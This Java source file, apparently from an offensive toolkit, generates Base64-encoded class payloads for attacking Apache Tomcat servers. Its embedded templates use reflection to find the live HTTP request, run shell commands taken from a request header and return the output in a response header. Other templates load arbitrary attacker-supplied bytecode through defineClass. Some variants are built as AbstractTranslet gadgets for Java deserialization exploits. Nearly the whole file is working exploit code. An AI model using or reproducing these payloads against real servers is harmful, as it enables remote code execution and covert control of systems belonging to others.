package com.droplab.Utils.Echo;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.compile.JavaStringCompiler;

import java.io.IOException;
import java.util.Base64;
import java.util.Map;

/**
 * tomcat回显获取
 */
public class TomcatEcho {
    private static TomcatEcho tomcatEcho = null;
    private final String TomcatEchoExecString = "import java.io.*;import java.lang.reflect.Field;import java.nio.charset.StandardCharsets;import java.lang.reflect.Method;import java.util.Base64;import java.util.List;public class %s {    public %s() {        try {            String cmd = null;            String echo = null;            boolean done = false;            Thread[] ts = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\"));            for (int i = 0; i < ts.length; ++i) {                Thread t = ts[i];                if (t != null) {                    String s = t.getName();                    if (!s.contains(\"exec\") && s.contains(\"http\")) {                        Object o = getFV(t, \"target\");                        if (o instanceof Runnable) {                            try {                                o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");                            } catch (Exception var16) {                                continue;                            }                            List ps = (List) getFV(o, \"processors\");                            for (int j = 0; j < ps.size(); ++j) {                                Object p = ps.get(j);                                o = getFV(p, \"req\");                                Object conreq = o.getClass().getMethod(\"getNote\", Integer.TYPE).invoke(o, new Integer(1));                                Object response = conreq.getClass().getMethod(\"getResponse\").invoke(conreq);                                echo = (String) conreq.getClass().getMethod(\"getHeader\", String.class).invoke(conreq, new String(\"Testecho\"));                                cmd = (String) conreq.getClass().getMethod(\"getHeader\", String.class).invoke(conreq, new String(\"Testdmc\"));                                if ((echo != null && !echo.isEmpty()) || (cmd != null && !cmd.isEmpty())) {                                    done = true;                                    if (!echo.isEmpty()) {                                        response.getClass().getMethod(\"addHeader\", String.class, String.class).invoke(response, new String(\"TestEcho\"), new String(\"TestEcho\"));                                    }                                    if (!cmd.isEmpty()) {                                        String[] cmd_ = cmd.split(\" \");                                        String[] strings = new String[cmd_.length + 2];                                        String osName = System.getProperty(\"os.name\");                                        if (osName.startsWith(\"Windows\")) {                                            strings[0] = \"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\cmd.exe\";                                            strings[1] = \"/c\";                                        } else {                                            strings[0] = \"/bin/sh\";                                            strings[1] = \"-c\";                                        }                                        for (int k = 0; k < cmd_.length; k++) {                                            strings[k + 2] = cmd_[k];                                        }                                        StringBuilder re = new StringBuilder();                                        InputStream input = new ProcessBuilder(strings).start().getInputStream();                                        BufferedReader bufrIn = new BufferedReader(new InputStreamReader(input, \"UTF-8\"));                                        String line;                                        while ((line = bufrIn.readLine()) != null) {                                            re.append(line).append('\\n');                                        }                                        String s1 = Base64.getEncoder().encodeToString(re.toString().getBytes(StandardCharsets.UTF_8));                                        response.getClass().getMethod(\"addHeader\", String.class, String.class).invoke(response, new String(\"Testdmc\"), s1);                                    }                                }                                if (done) {                                    break;                                }                            }                            if (done) {                                break;                            }                        }                    }                }            }        } catch (Exception var17) {}    }    private Object getFV(Object o, String s) throws Exception {        Field f = null;        Class clazz = o.getClass();        while (clazz != Object.class) {            try {                f = clazz.getDeclaredField(s);                break;            } catch (NoSuchFieldException var5) {                clazz = clazz.getSuperclass();            }        }        if (f == null) {            throw new NoSuchFieldException(s);        } else {            f.setAccessible(true);            return f.get(o);        }    }}";
    private final String TomcatEchoDefineClass="import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Base64;import java.util.List;public class %s {    public %s() {        try {            String dy = null;            boolean done = false;            Thread[] ts = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\"));            for (int i = 0; i < ts.length; ++i) {                Thread t = ts[i];                if (t != null) {                    String s = t.getName();                    if (!s.contains(\"exec\") && s.contains(\"http\")) {                        Object o = getFV(t, \"target\");                        if (o instanceof Runnable) {                            try {                                o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");                            } catch (Exception var16) {                                continue;                            }                            List ps = (List) getFV(o, \"processors\");                            for (int j = 0; j < ps.size(); ++j) {                                Object p = ps.get(j);                                o = getFV(p, \"req\");                                Object conreq = o.getClass().getMethod(\"getNote\", Integer.TYPE).invoke(o, new Integer(1));                                Object response = conreq.getClass().getMethod(\"getResponse\").invoke(conreq);                                dy = (String) conreq.getClass().getMethod(\"%s\", String.class).invoke(conreq, new String(\"dy\"));                                if(dy != null && !dy.isEmpty()){                                    done=true;                                    byte[] d = Base64.getDecoder().decode(dy);                                    response.getClass().getMethod(\"addHeader\", String.class, String.class).invoke(response, new String(\"TestEcho\"), new String(\"TestEcho\"));                                    ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();                                    Class<?> aClass = clzLoader.loadClass(\"java.lang.ClassLoader\");                                    Method defineClass = aClass.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);                                    defineClass.setAccessible(true);                                    ( (Class)defineClass.invoke(clzLoader, d, 0, d.length)).newInstance();                                }                                if (done) {                                    break;                                }                            }                        }                        if (done) {                            break;                        }                    }                }            }        } catch (Exception var17) { }    }    private Object getFV(Object o, String s) throws Exception {        Field f = null;        Class clazz = o.getClass();        while (clazz != Object.class) {            try {                f = clazz.getDeclaredField(s);                break;            } catch (NoSuchFieldException var5) {                clazz = clazz.getSuperclass();            }        }        if (f == null) {            throw new NoSuchFieldException(s);        } else {            f.setAccessible(true);            return f.get(o);        }    }}";

    private final String TomcatEchoExecStringTemplate="import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.*;import java.lang.reflect.Field;import java.nio.charset.StandardCharsets;import java.util.Base64;import java.util.List;public class %s extends AbstractTranslet implements Serializable {    private static final long serialVersionUID = -5971610431559700674L;    public %s() {        try {            String cmd = null;            String echo = null;            boolean done = false;            Thread[] ts = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\"));            for (int i = 0; i < ts.length; ++i) {                Thread t = ts[i];                if (t != null) {                    String s = t.getName();                    if (!s.contains(\"exec\") && s.contains(\"http\")) {                        Object o = getFV(t, \"target\");                        if (o instanceof Runnable) {                            try {                                o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");                            } catch (Exception var16) {                                continue;                            }                            List ps = (List) getFV(o, \"processors\");                            for (int j = 0; j < ps.size(); ++j) {                                Object p = ps.get(j);                                o = getFV(p, \"req\");                                Object conreq = o.getClass().getMethod(\"getNote\", Integer.TYPE).invoke(o, new Integer(1));                                Object response = conreq.getClass().getMethod(\"getResponse\").invoke(conreq);                                echo = (String) conreq.getClass().getMethod(\"getHeader\", String.class).invoke(conreq, new String(\"Testecho\"));                                cmd = (String) conreq.getClass().getMethod(\"getHeader\", String.class).invoke(conreq, new String(\"Testdmc\"));                                if ((echo != null && !echo.isEmpty()) || (cmd != null && !cmd.isEmpty())) {                                    done = true;                                    if (!echo.isEmpty()) {                                        response.getClass().getMethod(\"addHeader\", String.class, String.class).invoke(response, new String(\"TestEcho\"), new String(\"TestEcho\"));                                    }                                    if (!cmd.isEmpty()) {                                        String[] cmd_ = cmd.split(\" \");                                        String[] strings = new String[cmd_.length + 2];                                        String osName = System.getProperty(\"os.name\");                                        if (osName.startsWith(\"Windows\")) {                                            strings[0] = \"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\cmd.exe\";                                            strings[1] = \"/c\";                                        } else {                                            strings[0] = \"/bin/sh\";                                            strings[1] = \"-c\";                                        }                                        for (int k = 0; k < cmd_.length; k++) {                                            strings[k + 2] = cmd_[k];                                        }                                        StringBuilder re = new StringBuilder();                                        InputStream input = new ProcessBuilder(strings).start().getInputStream();                                        BufferedReader bufrIn = new BufferedReader(new InputStreamReader(input, \"UTF-8\"));                                        String line;                                        while ((line = bufrIn.readLine()) != null) {                                            re.append(line).append('\\n');                                        }                                        String s1 = Base64.getEncoder().encodeToString(re.toString().getBytes(StandardCharsets.UTF_8));                                        response.getClass().getMethod(\"addHeader\", String.class, String.class).invoke(response, new String(\"Testdmc\"), s1);                                    }                                }                                if (done) {                                    break;                                }                            }                            if (done) {                                break;                            }                        }                    }                }            }        } catch (Exception var17) {        }    }    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {    }    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {    }    private Object getFV(Object o, String s) throws Exception {        Field f = null;        Class clazz = o.getClass();        while (clazz != Object.class) {            try {                f = clazz.getDeclaredField(s);                break;            } catch (NoSuchFieldException var5) {                clazz = clazz.getSuperclass();            }        }        if (f == null) {            throw new NoSuchFieldException(s);        } else {            f.setAccessible(true);            return f.get(o);        }    }}";
    private final String TomcatEchoDefineClassTemplate="import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.Serializable;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Base64;import java.util.List;public class %s extends AbstractTranslet implements Serializable {    private static final long serialVersionUID = -5971610431559700674L;    public %s() {        try {            String dy = null;            boolean done = false;            Thread[] ts = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\"));            for (int i = 0; i < ts.length; ++i) {                Thread t = ts[i];                if (t != null) {                    String s = t.getName();                    if (!s.contains(\"exec\") && s.contains(\"http\")) {                        Object o = getFV(t, \"target\");                        if (o instanceof Runnable) {                            try {                                o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");                            } catch (Exception var16) {                                continue;                            }                            List ps = (List) getFV(o, \"processors\");                            for (int j = 0; j < ps.size(); ++j) {                                Object p = ps.get(j);                                o = getFV(p, \"req\");                                Object conreq = o.getClass().getMethod(\"getNote\", Integer.TYPE).invoke(o, new Integer(1));                                Object response = conreq.getClass().getMethod(\"getResponse\").invoke(conreq);                                dy = (String) conreq.getClass().getMethod(\"%s\", String.class).invoke(conreq, new String(\"dy\"));                                if (dy != null && !dy.isEmpty()) {                                    done = true;                                    byte[] d = Base64.getDecoder().decode(dy);                                    response.getClass().getMethod(\"addHeader\", String.class, String.class).invoke(response, new String(\"TestEcho\"), new String(\"TestEcho\"));                                    ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();                                    Class<?> aClass = clzLoader.loadClass(\"java.lang.ClassLoader\");                                    Method defineClass = aClass.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);                                    defineClass.setAccessible(true);                                    ((Class) defineClass.invoke(clzLoader, d, 0, d.length)).newInstance();                                }                                if (done) {                                    break;                                }                            }                        }                        if (done) {                            break;                        }                    }                }            }        } catch (Exception var17) {        }    }    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {    }    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {            }    private Object getFV(Object o, String s) throws Exception {        Field f = null;        Class clazz = o.getClass();        while (clazz != Object.class) {            try {                f = clazz.getDeclaredField(s);                break;            } catch (NoSuchFieldException var5) {                clazz = clazz.getSuperclass();            }        }        if (f == null) {            throw new NoSuchFieldException(s);        } else {            f.setAccessible(true);            return f.get(o);        }    }}";

    public static TomcatEcho instance() {
        if (tomcatEcho != null) {

        } else {
            tomcatEcho = new TomcatEcho();
        }
        return tomcatEcho;
    }

    /**
     * 命令执行回显
     * @return
     */
    public String getTomcatEchoExecString(String type) {
        try {
            String randomStr = CommonUtils.RandomStr(6);
            JavaStringCompiler compiler = new JavaStringCompiler();
            Map<String, byte[]> compile = null;
            String format=null;
            if (type.equals("template")){
                format = String.format(TomcatEchoExecStringTemplate,randomStr,randomStr);
            }else {
                format = String.format(TomcatEchoExecString, randomStr, randomStr);
            }
            compile = compiler.compile(randomStr + ".java", format);
            byte[] bytes = compile.get(randomStr);
            return Base64.getEncoder().encodeToString(bytes);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * 任意代码执行回显
     * @return
     */
    public String getTomcatEchoDefineClass(String type,String types){
        try {
            String randomStr = CommonUtils.RandomStr(6);
            JavaStringCompiler compiler = new JavaStringCompiler();
            Map<String, byte[]> compile = null;
            String format = "";
            if (types.equals("template")){
                if(type.equals("header")){
                    format = String.format(TomcatEchoDefineClassTemplate, randomStr, randomStr,"getHeader");
                }else {
                    format = String.format(TomcatEchoDefineClassTemplate, randomStr, randomStr,"getParameter");
                }
            }else {
                if(type.equals("header")){
                    format = String.format(TomcatEchoDefineClass, randomStr, randomStr,"getHeader");
                }else {
                    format = String.format(TomcatEchoDefineClass, randomStr, randomStr,"getParameter");
                }
            }

            compile = compiler.compile(randomStr + ".java", format);
            byte[] bytes = compile.get(randomStr);
            return Base64.getEncoder().encodeToString(bytes);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
